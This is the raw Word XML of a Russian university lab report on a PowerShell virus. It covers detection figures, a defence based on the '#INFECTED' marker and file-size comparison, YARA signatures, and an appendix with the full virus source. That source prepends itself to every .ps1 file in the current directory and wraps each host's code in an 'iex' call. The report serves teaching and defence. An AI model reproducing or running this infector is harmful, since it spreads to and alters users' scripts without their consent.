                    <w:p w14:paraId="259F3C83" w14:textId="5D94518F" w:rsidR="005438C9" w:rsidRPr="0094040A" w:rsidRDefault="00C1681C" w:rsidP="00C1681C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C1681C">
                        <w:rPr>
                          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
                          <w:color w:val="A82D00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9077BC" w14:textId="5B7D6F7C" w:rsidR="00F72384" w:rsidRDefault="00F72384" w:rsidP="00984831">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38A2985D" w14:textId="77777777" w:rsidR="00F72384" w:rsidRDefault="00F72384" w:rsidP="00F72384">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2918A0D8" wp14:editId="400C673F">
            <wp:extent cx="3976231" cy="2879782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8881" cy="288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65C6" w14:textId="64D54918" w:rsidR="00F72384" w:rsidRPr="00315E69" w:rsidRDefault="00F72384" w:rsidP="00315E69">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:instrText xml:space="preserve"> SEQ Рисунок \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="00315E69">
        <w:t>О</w:t>
      </w:r>
      <w:r>
        <w:t>бнаружение вируса в зараженных файлах и нет</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:p w14:paraId="5B58D23F" w14:textId="4F3DE3C7" w:rsidR="00160CFD" w:rsidRDefault="005D27F7" w:rsidP="00160CFD">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>Вариант защиты (без антивируса)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2943E467" w14:textId="3FE0F9DC" w:rsidR="00C732D9" w:rsidRDefault="005D27F7" w:rsidP="005D27F7">
      <w:r>
        <w:t>Алгоритм работы вируса опирается на метку</w:t>
      </w:r>
      <w:r w:rsidR="00C85B53">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">#INFECTED </w:t>
      </w:r>
      <w:r>
        <w:t>в начале файла. Если приписать такой комментарий, то файл не будет заражен. Пример на рисунке 2 и 6.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E94570" w14:textId="77777777" w:rsidR="00F56C63" w:rsidRDefault="00F56C63" w:rsidP="00F56C63">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B908033" wp14:editId="313766CB">
            <wp:extent cx="5193723" cy="744272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006" cy="7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529B" w14:textId="1C687B0D" w:rsidR="00984831" w:rsidRDefault="00F56C63" w:rsidP="00F56C63">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00CD47C7">
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Файл с защитой</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0ED67B" w14:textId="3696E350" w:rsidR="00984831" w:rsidRDefault="00984831" w:rsidP="005D27F7">
      <w:r>
        <w:t xml:space="preserve">Также можно сравнивать объемы файлов. Если он изменился </w:t>
      </w:r>
      <w:r w:rsidR="00AD39F7">
        <w:t>с помощью программы, а не пользователя, то надо проверить на наличие вируса.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BACD53" w14:textId="77777777" w:rsidR="005438C9" w:rsidRDefault="005438C9" w:rsidP="005438C9">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E9C9A6C" wp14:editId="445DE591">
            <wp:extent cx="5043054" cy="3155950"/>
            <wp:effectExtent l="0" t="0" r="571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463" cy="316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B4F2D" w14:textId="55EBA0D3" w:rsidR="005438C9" w:rsidRDefault="005438C9" w:rsidP="005438C9">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00202397">
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="003A5F24">
        <w:t xml:space="preserve"> С</w:t>
      </w:r>
      <w:r>
        <w:t>равнение файла без заражения и с ним</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F8A713" w14:textId="77777777" w:rsidR="005D27F7" w:rsidRPr="005D27F7" w:rsidRDefault="005D27F7" w:rsidP="005D27F7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="240B3FCE" w14:textId="0B587B2B" w:rsidR="006E5964" w:rsidRDefault="006E5964">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E2019E" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00830F2D">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:keepNext/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc214654506"/>
      <w:r>
        <w:t>Выводы</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="7FFD0F23" w14:textId="7619288B" w:rsidR="00202F1D" w:rsidRDefault="007528C5" w:rsidP="00315E69">
      <w:r w:rsidRPr="007528C5">
        <w:t xml:space="preserve">В ходе лабораторной работы </w:t>
      </w:r>
      <w:r w:rsidR="00315E69">
        <w:t>был успешно разработан и исследован ps1-вирус. Реализован функционирующий прототип вируса, способный заражать .ps1 файлы в текущей директории. Разработаны эффективные сигнатуры для обнаружения подобных угроз с использованием YARA-правил. Предложены практические методы защиты без использования антивирусного ПО. Исследованы механизмы распространения и маскировки вредоносного кода.</w:t>
      </w:r>
      <w:r w:rsidR="00EA504A">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F250674" w14:textId="70398918" w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidRDefault="00D342F1" w:rsidP="00D926B3">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>ПРИЛОЖЕНИЕ А</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A757094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>$INFECTION_MARKER = "#INFECTED"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566C8879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>$CURRENT_SCRIPT_PATH = $PSCommandPath</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBC7854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>$PARENT_DIRECTORY = Split-Path $CURRENT_SCRIPT_PATH -Parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0560F75A" w14:textId="77777777" w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidRDefault="00D926B3" w:rsidP="00D926B3">
      <w:pPr>
        <w:pStyle w:val="ac"/>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73FDDA16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># Функция для проверки, заражен ли файл</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA46624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>function Test-FileInfected($FilePath) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EF5F7F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try {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2F850B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$content = Get-Content $FilePath -Raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0FE538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return $content -match $INFECTION_MARKER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D95050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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEAE507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catch {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6120D4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return $false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B350C0E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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1C40EA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>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF323F4" w14:textId="77777777" w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidRDefault="00D926B3" w:rsidP="00D926B3">
      <w:pPr>
        <w:pStyle w:val="ac"/>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DB72467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# </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Функция</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>для</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>заражения</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>файла</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FC5850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>function Infect-File($TargetFilePath) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD4C72F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# Проверяем, не пытаемся ли заразить сами себя или уже зараженный файл</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EA32E8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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>if ($TargetFilePath -eq $CURRENT_SCRIPT_PATH -or (Test-FileInfected $TargetFilePath)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AFF082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</w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>return $false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AA7962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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FF4306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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F948CE" w14:textId="5FA22D33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try {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016AC72B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$targetContent = Get-Content $TargetFilePath -Raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78675A8D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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3009D5F0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# </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Читаем</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>содержимое</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>текущего</w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04612571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$virusContent = Get-Content $CURRENT_SCRIPT_PATH -Raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201781BE" w14:textId="3DFB695B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</w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D90BAC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    $virusParts = $virusContent -split "`n#=="</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BA8135" w14:textId="4F09973A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    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFB80FB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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">$infectedContent = $INFECTION_MARKER + "`n" + </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148FF5E7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                  $virusParts[0] + "`n" + </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D954CA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                  "#===`n" + </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3996BA3A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                  'try{iex @"' + "`n" + </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66730BD3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</w:rPr>
        <w:t xml:space="preserve">                          </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">$targetContent + "`n" + </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669985CD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                      '"@}catch{}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151665EC" w14:textId="3F36580F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    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1750D7CB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Set-Content $TargetFilePath $infectedContent -Force</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13733E0C" w14:textId="77777777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</w:rPr>
        <w:t xml:space="preserve">        return $true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472007C8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</w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7710D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catch {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E18E10F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    return $false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7EAE0D" w14:textId="77777777" w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidRDefault="00D926B3" w:rsidP="00D926B3">
      <w:pPr>
        <w:pStyle w:val="ac"/>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A68376" w14:textId="75E80C00" w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidRDefault="00D926B3" w:rsidP="00D926B3">
      <w:pPr>
        <w:pStyle w:val="ac"/>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D926B3">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00D926B3" w:rsidRPr="00D926B3" w:rsidSect="00D60F71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98000" w14:textId="77777777" w:rsidR="00B5436E" w:rsidRPr="00D60F71" w:rsidRDefault="00B5436E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25DCA8B" w14:textId="77777777" w:rsidR="00B5436E" w:rsidRPr="00D60F71" w:rsidRDefault="00B5436E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085284D" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00C53ADA" w:rsidRDefault="00C53ADA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55241">
          <w:rPr>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>10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047C3" w14:textId="77777777" w:rsidR="00B5436E" w:rsidRPr="00D60F71" w:rsidRDefault="00B5436E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D81D6BF" w14:textId="77777777" w:rsidR="00B5436E" w:rsidRPr="00D60F71" w:rsidRDefault="00B5436E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A1335F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="87CE57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0BB84594"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7BDAEDEA"/>
    <w:lvl w:ilvl="0" w:tplc="7D9E8230">
      <w:start w:val="5"/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C1C7B32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4FC27D0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="073A88FC"/>
    <w:lvl w:ilvl="0" w:tplc="7D9E8230">
      <w:start w:val="5"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2062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549489F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6D388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240630"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FDEE29F0"/>
    <w:lvl w:ilvl="0" w:tplc="81204AD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A1A7A78"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="13B467D6"/>
    <w:lvl w:ilvl="0" w:tplc="7D9E8230">
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1571" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia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4DD93EDA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5D9470FC"/>
    <w:lvl w:ilvl="0" w:tplc="A2CAA35A">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter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0E4741E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97E0373"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="69A2DAB4"/>
    <w:lvl w:ilvl="0" w:tplc="7D9E8230">
      <w:start w:val="5"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1571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123824"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="62A6F1F0"/>
    <w:lvl w:ilvl="0" w:tplc="4DEA7B0A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ED25D74"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="689460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605C90"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0498AE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7"/>
  </w:num>
  <w:num w:numId="2">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="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23"/>
  </w:num>
  <w:num w:numId="46">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="47">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="48">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="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35A6"/>
    <w:rsid w:val="00017450"/>
    <w:rsid w:val="000277F4"/>
    <w:rsid w:val="00035C4C"/>
    <w:rsid w:val="000604F5"/>
    <w:rsid w:val="0006172D"/>
    <w:rsid w:val="000820AD"/>
    <w:rsid w:val="00090579"/>
    <w:rsid w:val="0009138C"/>
    <w:rsid w:val="00093ADB"/>
    <w:rsid w:val="000B060E"/>
    <w:rsid w:val="000B1F41"/>
    <w:rsid w:val="000C12AA"/>
    <w:rsid w:val="000C1631"/>
    <w:rsid w:val="000E3888"/>
    <w:rsid w:val="000E3EE4"/>
    <w:rsid w:val="001507EF"/>
    <w:rsid w:val="00151BEC"/>
    <w:rsid w:val="00156463"/>
    <w:rsid w:val="00160CFD"/>
    <w:rsid w:val="00162375"/>
    <w:rsid w:val="00195AFF"/>
    <w:rsid w:val="001B1B03"/>
    <w:rsid w:val="001B32F7"/>
    <w:rsid w:val="001C103A"/>
    <w:rsid w:val="001D4146"/>
    <w:rsid w:val="001E6E38"/>
    <w:rsid w:val="001E74F8"/>
    <w:rsid w:val="001F5F19"/>
    <w:rsid w:val="0020070E"/>
    <w:rsid w:val="00202397"/>
    <w:rsid w:val="00202F1D"/>
    <w:rsid w:val="00204925"/>
    <w:rsid w:val="002074EF"/>
    <w:rsid w:val="002313A9"/>
    <w:rsid w:val="002523D2"/>
    <w:rsid w:val="0025334A"/>
    <w:rsid w:val="002629B9"/>
    <w:rsid w:val="002A5044"/>
    <w:rsid w:val="002D1672"/>
    <w:rsid w:val="002D5C58"/>
    <w:rsid w:val="002E373A"/>
    <w:rsid w:val="00312B77"/>
    <w:rsid w:val="00315E69"/>
    <w:rsid w:val="00327A23"/>
    <w:rsid w:val="0033405F"/>
    <w:rsid w:val="00335FD9"/>
    <w:rsid w:val="00353231"/>
    <w:rsid w:val="00355241"/>
    <w:rsid w:val="0037417C"/>
    <w:rsid w:val="00384ECC"/>
    <w:rsid w:val="00395E78"/>
    <w:rsid w:val="003A1CBB"/>
    <w:rsid w:val="003A5F24"/>
    <w:rsid w:val="003B2153"/>
    <w:rsid w:val="003B7418"/>
    <w:rsid w:val="003C218B"/>
    <w:rsid w:val="003E4132"/>
    <w:rsid w:val="003E4C7B"/>
    <w:rsid w:val="0040671E"/>
    <w:rsid w:val="004156CB"/>
    <w:rsid w:val="0045798B"/>
    <w:rsid w:val="004729B8"/>
    <w:rsid w:val="00475C3D"/>
    <w:rsid w:val="00497F6F"/>
    <w:rsid w:val="004B18E7"/>
    <w:rsid w:val="004B37E8"/>
    <w:rsid w:val="004B42A1"/>
    <w:rsid w:val="004B5CD2"/>
    <w:rsid w:val="004F2A89"/>
    <w:rsid w:val="004F63EF"/>
    <w:rsid w:val="004F7F88"/>
    <w:rsid w:val="00500D2B"/>
    <w:rsid w:val="00516DFF"/>
    <w:rsid w:val="00530C0A"/>
    <w:rsid w:val="005438C9"/>
    <w:rsid w:val="00543F39"/>
    <w:rsid w:val="00544F2D"/>
    <w:rsid w:val="00551128"/>
    <w:rsid w:val="005724C6"/>
    <w:rsid w:val="005865C7"/>
    <w:rsid w:val="005A3B73"/>
    <w:rsid w:val="005C0A3C"/>
    <w:rsid w:val="005D1199"/>
    <w:rsid w:val="005D27F7"/>
    <w:rsid w:val="005D2800"/>
    <w:rsid w:val="005E4F2A"/>
    <w:rsid w:val="00602D9D"/>
    <w:rsid w:val="00672BC0"/>
    <w:rsid w:val="00674524"/>
